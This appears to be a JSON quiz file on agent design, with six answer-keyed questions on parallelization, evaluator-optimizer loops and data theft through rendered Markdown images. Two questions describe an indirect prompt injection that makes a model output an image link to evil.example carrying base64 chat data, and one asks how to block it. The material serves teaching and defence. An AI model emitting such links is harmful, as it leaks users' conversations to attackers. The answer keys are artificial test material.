@@ -1,0 +1,250 @@
+{
+  "schema_version": 2,
+  "concepts": [
+    {
+      "id": "c029-markdown-image-exfiltration",
+      "name": "Exfiltration through rendered Markdown images"
+    },
+    {
+      "id": "c029-sectioning-vs-voting",
+      "name": "Parallelization: sectioning vs voting"
+    },
+    {
+      "id": "c029-evaluator-optimizer-fit",
+      "name": "When evaluator-optimizer pays off"
+    }
+  ],
+  "questions": [
+    {
+      "id": "c029-q01",
+      "lesson": null,
+      "concept": "c029-markdown-image-exfiltration",
+      "type": "multiple_choice",
+      "prompt": "Your chat app renders the model's replies as Markdown. An injected document makes the model write `![](https://evil.example/p?d=<base64 of the chat>)`. Why does this leak data even if the user clicks nothing?",
+      "choices": [
+        {
+          "id": "a",
+          "text": "The browser fetches the image URL on render, which sends the data along"
+        },
+        {
+          "id": "b",
+          "text": "Base64 text inside Markdown runs as a script once the browser decodes it"
+        },
+        {
+          "id": "c",
+          "text": "The image tag hands the attacker's server your app's session cookie"
+        },
+        {
+          "id": "d",
+          "text": "The model provider forwards the URL to its owner when it logs the reply"
+        }
+      ],
+      "answer": "a",
+      "explanation": "Rendering an image makes the browser request its URL, so data the model encoded into the URL (path, parameters or subdomain) goes to the attacker's server with no user interaction. Base64 is just an encoding, not code, and a request to another domain doesn't carry your app's cookies.",
+      "materials": [
+        "simon-willison-the-lethal-trifecta-for"
+      ],
+      "sources": [
+        {
+          "url": "https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks",
+          "title": "How Microsoft defends against indirect prompt injection attacks",
+          "publisher": "Microsoft Security Response Center",
+          "accessed": "2026-10-02",
+          "claim": "Attackers can make the LLM output an HTML or Markdown image whose URL points at their server with the data encoded in it (for example base64 in a subdomain, path or parameters); the browser then requests it and exfiltrates the data without any user interaction."
+        }
+      ]
+    },
+    {
+      "id": "c029-q02",
+      "lesson": null,
+      "concept": "c029-sectioning-vs-voting",
+      "type": "multiple_choice",
+      "prompt": "You run three LLM calls at once, each reviewing the same code for vulnerabilities with a different prompt, and flag the code if any finds a problem. Which variant of Anthropic's parallelization workflow is this?",
+      "choices": [
+        {
+          "id": "a",
+          "text": "Sectioning: the job is split into independent subtasks that run at once"
+        },
+        {
+          "id": "b",
+          "text": "Voting: the same task runs several times to get more confident results"
+        },
+        {
+          "id": "c",
+          "text": "Orchestrator-workers: a central LLM picks the subtasks for workers"
+        },
+        {
+          "id": "d",
+          "text": "Prompt chaining: each call works on the output of the call before it"
+        }
+      ],
+      "answer": "b",
+      "explanation": "Voting runs the same task several times to get diverse outputs; reviewing code for vulnerabilities with several prompts is Anthropic's own example. Sectioning would split the job into different independent pieces, such as a screen and an answer. Nothing here is chosen by an orchestrator or passed from one call to the next.",
+      "materials": [
+        "anthropic-building-effective-agents"
+      ],
+      "sources": [
+        {
+          "url": "https://www.anthropic.com/engineering/building-effective-agents",
+          "title": "Building effective agents",
+          "publisher": "Anthropic",
+          "accessed": "2026-10-02",
+          "claim": "Parallelization has two variations: sectioning breaks a task into independent subtasks run in parallel, and voting runs the same task multiple times for diverse outputs, for example several prompts reviewing code for vulnerabilities."
+        }
+      ]
+    },
+    {
+      "id": "c029-q03",
+      "lesson": null,
+      "concept": "c029-evaluator-optimizer-fit",
+      "type": "written",
+      "prompt": "An interviewer asks: \"Where does evaluator-optimizer waste money?\" Say how the pattern works, when it pays off, and when it doesn't.",
+      "model_answer": {
+        "summary": "One call generates and another evaluates and gives feedback in a loop, so every round costs more calls and latency. It pays off only with clear evaluation criteria and measurable gains from refining.",
+        "key_points": [
+          "One LLM call generates a response while another evaluates it and gives feedback, in a loop, so each round adds calls, cost and latency",
+          "It pays off when there are clear evaluation criteria and iterative refinement gives measurable value, such as literary translation or multi-round search",
+          "Signs of a good fit: answers clearly improve when a human gives feedback, and an LLM can give that kind of feedback itself",
+          "Without clear criteria, or when a first answer is already good enough, the extra rounds add cost and latency with no measurable gain"
+        ]
+      },
+      "explanation": "Agentic patterns trade latency and cost for better results, and that trade only makes sense when it buys something you can measure. Evaluator-optimizer multiplies calls by the number of rounds, so it wastes money on tasks with vague criteria (the critic can't tell what better means) or where the first draft is already good.",
+      "materials": [
+        "anthropic-building-effective-agents"
+      ],
+      "sources": [
+        {
+          "url": "https://www.anthropic.com/engineering/building-effective-agents",
+          "title": "Building effective agents",
+          "publisher": "Anthropic",
+          "accessed": "2026-10-02",
+          "claim": "In evaluator-optimizer one LLM call generates a response while another evaluates and gives feedback in a loop; it is effective when there are clear evaluation criteria and iterative refinement provides measurable value, with two signs of fit (responses improve with human feedback, and an LLM can give such feedback); agentic systems trade latency and cost for performance."
+        }
+      ]
+    },
+    {
+      "id": "c029-q04",
+      "lesson": null,
+      "concept": "c029-markdown-image-exfiltration",
+      "type": "multiple_choice",
+      "prompt": "Your agent's chat UI renders Markdown, and an injected page can make the model emit an image URL holding stolen data. Which fix most reliably stops the leak?",
+      "choices": [
+        {
+          "id": "a",
+          "text": "Tell the model in its system prompt never to output Markdown images"
+        },
+        {
+          "id": "b",
+          "text": "Don't load images from arbitrary URLs: render only an allow-list"
+        },
+        {
+          "id": "c",
+          "text": "Scan each reply with a classifier that flags 95% of injected text"
+        },
+        {
+          "id": "d",
+          "text": "Strip base64 from replies, since data can only leave base64-encoded"
+        }
+      ],
+      "answer": "b",
+      "explanation": "The reliable fix is to remove the exfiltration vector deterministically: if the UI never fetches images from arbitrary hosts, the encoded URL goes nowhere. A prompt rule or a 95% classifier can be bypassed by the same injection, and the data can be encoded many ways, not only as base64.",
+      "materials": [
+        "simon-willison-the-lethal-trifecta-for"
+      ],
+      "sources": [
+        {
+          "url": "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/",
+          "title": "The lethal trifecta for AI agents: private data, untrusted content, and external communication",
+          "publisher": "Simon Willison",
+          "accessed": "2026-10-02",
+          "claim": "Any tool that can make an HTTP request, including loading an image, can pass stolen data to an attacker; vendors fixed such leaks by locking down the exfiltration vector, and guardrails catching 95% of attacks are a failing grade."
+        },
+        {
+          "url": "https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks",
+          "title": "How Microsoft defends against indirect prompt injection attacks",
+          "publisher": "Microsoft Security Response Center",
+          "accessed": "2026-10-02",
+          "claim": "Microsoft deterministically blocks the data exfiltration technique of injected image URLs, rather than relying only on probabilistic detection, and the data can be encoded in a subdomain, path or parameters."
+        }
+      ]
+    },
+    {
+      "id": "c029-q05",
+      "lesson": null,
+      "concept": "c029-sectioning-vs-voting",
+      "type": "multiple_choice",
+      "prompt": "One model screens each user query for inappropriate requests while a second call answers it, both at the same time. Which pattern is this, and why does Anthropic prefer it to one call doing both?",
+      "choices": [
+        {
+          "id": "a",
+          "text": "Voting: two models judge the same query, so their verdicts are combined"
+        },
+        {
+          "id": "b",
+          "text": "Routing: the screen sends each query on to the best specialised prompt"
+        },
+        {
+          "id": "c",
+          "text": "Sectioning: separate calls for each concern tend to perform better"
+        },
+        {
+          "id": "d",
+          "text": "Evaluator-optimizer: one call critiques the other's draft in a loop"
+        }
+      ],
+      "answer": "c",
+      "explanation": "Splitting a job into independent pieces run in parallel is sectioning, and a guardrail call beside the answering call is Anthropic's example: it tends to perform better than having one LLM call handle both the guardrail and the response. Voting would run the same task several times; here the two calls do different tasks.",
+      "materials": [
+        "anthropic-building-effective-agents"
+      ],
+      "sources": [
+        {
+          "url": "https://www.anthropic.com/engineering/building-effective-agents",
+          "title": "Building effective agents",
+          "publisher": "Anthropic",
+          "accessed": "2026-10-02",
+          "claim": "Sectioning example: one model instance processes user queries while another screens them for inappropriate content or requests, which tends to perform better than having the same LLM call handle both guardrails and the core response."
+        }
+      ]
+    },
+    {
+      "id": "c029-q06",
+      "lesson": null,
+      "concept": "c029-evaluator-optimizer-fit",
+      "type": "multiple_choice",
+      "prompt": "Which task fits Anthropic's evaluator-optimizer workflow best?",
+      "choices": [
+        {
+          "id": "a",
+          "text": "Translating a novel, where a critic's notes on nuance improve each draft"
+        },
+        {
+          "id": "b",
+          "text": "Tagging each support ticket with one of five fixed labels from a short list"
+        },
+        {
+          "id": "c",
+          "text": "Extracting the date and total from invoices that all share one layout"
+        },
+        {
+          "id": "d",
+          "text": "Answering FAQ questions by looking up the one matching stored answer"
+        }
+      ],
+      "answer": "a",
+      "explanation": "Evaluator-optimizer fits when there are clear evaluation criteria and refining gives measurable value, and when an LLM can give the kind of feedback a human would. Literary translation is Anthropic's example. The other tasks have one right answer that a single call (or plain code) gets; a critique loop would only add cost.",
+      "materials": [
+        "anthropic-building-effective-agents"
+      ],
+      "sources": [
+        {
+          "url": "https://www.anthropic.com/engineering/building-effective-agents",
+          "title": "Building effective agents",
+          "publisher": "Anthropic",
+          "accessed": "2026-10-02",
+          "claim": "Evaluator-optimizer is effective with clear evaluation criteria and when iterative refinement provides measurable value; an example is literary translation, where an evaluator LLM can give useful critiques of nuances the translator missed."
+        }
+      ]
+    }
+  ]
+}
